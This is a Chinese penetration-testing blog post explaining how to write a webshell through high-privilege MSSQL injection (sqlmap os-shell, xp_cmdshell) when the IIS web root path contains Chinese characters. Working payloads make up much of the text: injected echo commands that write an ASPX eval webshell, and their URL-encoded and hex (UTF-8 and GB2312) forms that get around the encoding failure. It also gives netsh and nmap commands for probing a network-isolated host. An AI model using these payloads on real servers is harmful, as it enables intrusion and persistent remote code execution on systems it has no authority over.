**0x01 前言**

下班回家的路上拿着手机翻看“潇湘信安技术交流群”聊天记录，看到@Bob、@goddemon两个老哥提到的问题挺感兴趣，正好前几天也帮朋友测试过类似问题，本地有这样的测试环境，所以回到家中就帮着给测试了下，并写了这篇记录文章，过程还是挺有意思的。

![图片](https://shs3.b.qianxin.com/butian_public/f5e78e3e38bfdcab2d9fa4d51cced2585.jpg)

**0x02 目标主机1问题描述**

MSSQL高权限注入，可以用sqlmap的os-shell调用xp\_cmdshell执行命令，站库分离，且数据库服务器为断网机，他通过分析猜测可能是因为那台主机没有设置网关导致的不出网。

所以想通过执行以下命令给重新设置下网关进行联网，然后再进行下一步测试，但由于网卡的网络连接名称中存在中文而执行失败，将该命令写入批处理文件后再执行，还是失败。

- 

```php
netsh int ip set address "本地连接" static 192.168.1.103 255.255.255.0 192.168.1.1
```

不过我们通过下图可以看到写入批处理文件中的中文字符是没有任何问题的，只是在读取和执行时中文才会出现乱码，最终导致命令执行失败，所以猜测这个问题可能出在sqlmap。

![图片](https://shs3.b.qianxin.com/butian_public/f58852f23e995353d3ba8e424005a0be7.jpg)

**0x03 目标主机2问题描述**

MSSQL高权限注入，可以用sqlmap的os-shell调用xp\_cmdshell执行命令，不是站库分离，但由于目标网站绝对路径中存在中文导致无法写入文件，提示：系统找不到指定的路径。

- 

```php
sqlmap -u "http://192.168.1.108/sql.aspx?id=1" --os-shell --batch
```

![图片](https://shs3.b.qianxin.com/butian_public/f08be916fddad00a81cc1d05ab9bf8dfd.jpg)

而且这也是台断网机，本地搭建环境，没有设置网关，所以也不能直接利用远程下载等方式进行Getshell和获取CS/MSF会话，联网环境的利用方式就不多说了，大家应该都会。

![图片](https://shs3.b.qianxin.com/butian_public/fd50972b87e6b0befee30170b8f505a15.jpg)

看了下不出网原因，原以为是防火墙设置了出入站规则，如果是，我们只需使用netsh命令关闭防火墙即可，但通过命令查询后发现并没有开启防火墙。

- 

```php
netsh advfirewall show allprofile
```

![图片](https://shs3.b.qianxin.com/butian_public/f7efdac80d62e33c85549caa830d1cdc4.jpg)

这台主机IP为某某专网，禁Ping，Nmap带Pn参数扫描发现只开放80端口，所以很有可能是有设备限制了出入口流量，仅放行了80端口，但这仅是个人猜测，并没有进一步验证。

- 

```php
nmap -sV -Pn 210.**.***.159
```

![图片](https://shs3.b.qianxin.com/butian_public/f59f8e3964fc940518d8ddc887dab8ec6.jpg)

好了好了，越扯越远了，回归到正题上，咋继续往下看！！！

**0x04 通过浏览器手工写马**

使用谷歌浏览器在注入点后边执行以下SQL语句即可将马写入至中文路径，不过在写马时得在尖括号&lt;&gt;前用^转义下，否则是写不进去的，提示：此时不应有 &gt;。

- 

```php
;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell.aspx'--
```

![图片](https://shs3.b.qianxin.com/butian_public/ffccdf664bf37b33efd5a34b1dbd750e0.jpg)

@5号黯区博客中提到的火狐Hackbar插件执行报错的问题也进行了测试，并没有出现此类问题，猜测可能是他们当时火狐浏览器的编码或者插件问题吧，实战中注意下。

**简要分析：**

为什么能在浏览器写入至中文路径呢？因为浏览器编码是UTF-8，注入页面编码也是UTF-8，可以识别中文字符，而且浏览器也会给中文路径进行URL(UTF-8)编码，BurpSuite抓包解码看一下。

![图片](https://shs3.b.qianxin.com/butian_public/fafe2865534b8a618fdd0db640ea0ca4e.jpg)

**解码前：**

- 

```php
/sql.aspx?id=1;exec%20master..xp_cmdshell%20%27echo%20^%3C%@%20Page%20Language=%22Jscript%22%^%3E^%3C%%eval(Request.Item[%22xxxasec%22],%22unsafe%22);%^%3E%20%3E%20C:\inetpub\wwwroot\%E4%B8%AD%E6%96%87%E6%B5%8B%E8%AF%95\shell.aspx%27--
```

**解码后：**

- 

```php
/sql.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell.aspx'--
```

![图片](https://shs3.b.qianxin.com/butian_public/f7ffdd8c4bf9e69a1dfde5aaa6271c529.jpg)

**注：**浏览器默认编码是UTF-8，如果改为GBK或其他编码后就不能写至中文路径了。在渗透测试中需要注意的编码问题还有很多，如：浏览器、网页字符、数据库、命令终端编码等，经常会遇到这种因编码问题而出现字符乱码，导致读写不了文件、中文回显乱码等情况。

**0x05 sqlmap sql-shell写马**

进入sqlmap的sql-shell后执行以下SQL语句也可以将马写入至中文路径，为什么？通过BurpSuite抓包分析得知这其实和浏览器是一样的，sqlmap也会将中文路径进行URL(UTF-8)编码。

- 

```php
sqlmap -u "http://192.168.1.109/sql.aspx?id=1" --sql-shell --batch --proxy http://127.0.0.1:8080
```

- 

```php
exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell1.aspx'
```

![图片](https://shs3.b.qianxin.com/butian_public/f4b5cf3538ab782c2bb0b939743038e2d.jpg)

**解码前：**

- 

```php
/sql.aspx?id=1%3BEXEC%20master..xp_cmdshell%20%27echo%20%5E%3C%25%40%20Page%20Language%3D%22Jscript%22%25%5E%3E%5E%3C%25%25eval%28Request.Item%5B%22xxxasec%22%5D%2C%22unsafe%22%29%3B%25%5E%3E%20%3E%20C%3A%5Cinetpub%5Cwwwroot%5C%E4%B8%AD%E6%96%87%E6%B5%8B%E8%AF%95%5Cshell1.aspx%27--
```

**解码后：**

- 

```php
/sql.aspx?id=1;EXEC master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell1.aspx'--
```

![图片](https://shs3.b.qianxin.com/butian_public/f730d9cfa31bf30133391f61b94943162.jpg)

**注：**两个老哥遇到的都是MSSQL高权限注入在os-shell里不能执行带有中文的命令，当时我在本地测试找到以上两种解决方式，但他们在实战场景中都说没有成功，看来还是没有彻底解决该问题，这也说明了本地和实战还是存在些差异，还得根据实际情况去分析问题。

**0x06 sqlmap os-shell写马**

心有不甘的我决定再研究一下sqlmap的os-shell为什么不能执行带有中文的命令？继续使用BurpSuite抓取下os-shell的echo写马数据包，直接执行该命令还是会提示：系统找不到指定的路径。

- 

```php
sqlmap -u "http://192.168.1.109/sql.aspx?id=1" --os-shell --batch --proxy http://127.0.0.1:8080
```

- 

```php
echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell2.aspx
```

![图片](https://shs3.b.qianxin.com/butian_public/fbb260099bac540aa7def6dee208d9f14.jpg)

**解码前：**

- 

```php
/sql.aspx?id=1%3BDECLARE%20%40clit%20VARCHAR%288000%29%3BSET%20%40clit%3D0x6563686f205e3c25402050616765204c616e67756167653d224a73637269707422255e3e5e3c25256576616c28526571756573742e4974656d5b2278787861736563225d2c22756e7361666522293b255e3e203e20433a5c696e65747075625c777777726f6f745ce4b8ade69687e6b58be8af955c7368656c6c322e61737078%3BINSERT%20INTO%20sqlmapoutput%28data%29%20EXEC%20master..xp_cmdshell%20%40clit--
```

**解码后：**

- 

```php
/sql.aspx?id=1;DECLARE @clit VARCHAR(8000);SET @clit=0x6563686f205e3c25402050616765204c616e67756167653d224a73637269707422255e3e5e3c25256576616c28526571756573742e4974656d5b2278787861736563225d2c22756e7361666522293b255e3e203e20433a5c696e65747075625c777777726f6f745ce4b8ade69687e6b58be8af955c7368656c6c322e61737078;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @clit--
```

![图片](https://shs3.b.qianxin.com/butian_public/f27291285bffe185db03ad5ccf869e8e5.jpg)

数据包中已将空格和符号都转成URL编码了，硬读起来确实有些费劲，可以先进行URL解码，在解码后的内容中可以看到有一串HEX(UTF-8)编码，解码后的内容就是我们执行的echo写马命令。

**解码前：**

- 

```php
0x6563686f205e3c25402050616765204c616e67756167653d224a73637269707422255e3e5e3c25256576616c28526571756573742e4974656d5b2278787861736563225d2c22756e7361666522293b255e3e203e20433a5c696e65747075625c777777726f6f745ce4b8ade69687e6b58be8af955c7368656c6c322e61737078
```

**解码后：**

- 

```php
echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell2.aspx
```

![图片](https://shs3.b.qianxin.com/butian_public/f5c4f0433f41283540e74d20926042e52.jpg)

因为xp\_cmdshell调用的cmd.exe命令终端是GBK，所以这时我们还需要将解码后的写马命令再次进行HEX(GB2312)编码，然后BurpSuite替换掉原始数据包中的HEX(UTF-8)编码后再提交即可。

**编码后：**

- 

```php
6563686F205E3C25402050616765204C616E67756167653D224A73637269707422255E3E5E3C25256576616C28526571756573742E4974656D5B2278787861736563225D2C22756E7361666522293B255E3E203E20433A5C696E65747075625C777777726F6F745CD6D0CEC4B2E2CAD45C7368656C6C322E61737078
```

![图片](https://shs3.b.qianxin.com/butian_public/f16c6b9428fba4d3717e14188b5c399d5.jpg)

这时可以看到我们的马已经成功写入至中文路径，利用这种方式就可以完美解决两个老哥遇到的MSSQL高权限注入在sqlmap的os-shell中无法执行带有中文命令的问题。

![图片](https://shs3.b.qianxin.com/butian_public/f8b30b99a7bfc81a665d210f3de72c4a2.jpg)

**0x07 文末总结**

通过对两个老哥遇到的问题进行研究后发现其根本原因就是编码不一致，只要解决了编码问题就都不是问题了，大家可以自行学习了解下UTF-8和GB2312的URL、HEX编码之间的差别。

1、浏览器和sqlmap默认都是UTF-8，所以在提交SQL语句时中文路径的URL编码也必须是UTF-8，如果用GB2312的URL编码去提交肯定还是不行的，因为这样中文路径还是会乱码。

2、sqlmap中的os-shell参数是利用xp\_cmdshell通过cmd.exe执行的命令，cmd和powershell默认代码页为936（简体中文GBK），而sqlmap默认是以UTF-8提交的数据包，所以会乱码。

**0x08 参考链接**

<https://forum.90sec.org/thread-9716-1-1.html>

<https://blog.csdn.net/langkew/article/details/7888242>

<http://www.voidcn.com/article/p-nnhyesle-bms.html>

[http://www.dark5.net/blog/2019/06/18/SQLmap写shell遇到中文路径解决办法集合/](http://www.dark5.net/blog/2019/06/18/SQLmap%E5%86%99shell%E9%81%87%E5%88%B0%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%E9%9B%86%E5%90%88/)

文章授权转载于**潇湘信安**公众号